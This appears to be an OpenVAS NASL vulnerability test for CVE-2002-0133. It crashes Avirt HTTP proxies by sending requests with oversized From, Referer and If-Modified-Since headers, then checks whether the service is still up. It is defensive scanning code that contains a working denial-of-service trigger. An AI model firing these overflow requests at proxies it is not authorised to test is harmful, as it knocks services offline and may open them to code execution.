# OpenVAS Vulnerability Test
#
# Authors:
# Michel Arboi <arboi@alussinan.org>
#
# Copyright:
# Copyright (C) 2003 Michel Arboi
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
#

# Cf. RFC 1945 & RFC 2068

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.11715");
  script_version("2022-05-12T11:57:03+0000");
  script_cve_id("CVE-2002-0133");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"last_modification", value:"2022-05-12 11:57:03 +0000 (Thu, 12 May 2022)");
  script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
  script_name("Header Overflow Attack against HTTP Proxy");
  script_category(ACT_DESTRUCTIVE_ATTACK);
  script_copyright("Copyright (C) 2003 Michel Arboi");
  script_family("Gain a shell remotely");
  script_dependencies("proxy_use.nasl", "smtp_settings.nasl", "os_detection.nasl");
  script_require_ports("Services/http_proxy", 8080);
  script_mandatory_keys("Proxy/usage", "Host/runs_windows");

  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/3904");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/3905");

  script_tag(name:"summary", value:"It was possible to crash the HTTP proxy by sending an invalid
  request with a too long header.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP GET request and checks if the remote
  service is still available afterwards.");

  script_tag(name:"impact", value:"An attacker may exploit this vulnerability to make the proxy
  server to crash continually or even execute arbitrary code on the system.");

  script_tag(name:"affected", value:"The following products are known to be affected:

  - Avirt SOHO v4.2

  - Avirt Gateway v4.2

  - Avirt Gateway Suite v4.2

  Other products / versions might be affected as well.");

  script_tag(name:"solution", value:"Update the software.");

  script_tag(name:"qod_type", value:"remote_vul");
  script_tag(name:"solution_type", value:"VendorFix");

  exit(0);
}

include("http_func.inc");
include("smtp_func.inc");
include("port_service_func.inc");

port = service_get_port(default:8080, proto:"http_proxy");

if(http_is_dead(port:port))
  exit(0);

if(!soc = open_sock_tcp(port))
  exit(0);

domain = get_3rdparty_domain();

headers = make_list(
string("From: ", crap(2048), "@", crap(2048), ".org"),
string("If-Modified-Since: Sat, 29 Oct 1994 19:43:31 ", crap(data:"GMT", length:4096)),
string("Referer: http://", crap(4096), "/"),
# Many other HTTP/1.1 headers...
string("If-Unmodified-Since: Sat, 29 Oct 1994 19:43:31 ", crap(data:"GMT", length:2048)));

r1 = string("GET http://", domain, "/", rand(), " HTTP/1.0\r\n");
foreach h(headers) {
  r = string(r1, h, "\r\n\r\n");
  send(socket:soc, data:r);
  r = http_recv(socket:soc);
  close(soc);
  soc = open_sock_tcp(port);
  if(!soc) {
    security_message(port:port);
    exit(0);
  }
}

close(soc);

if(http_is_dead(port:port)) {
  security_message(port:port);
  exit(0);
}

exit(99);
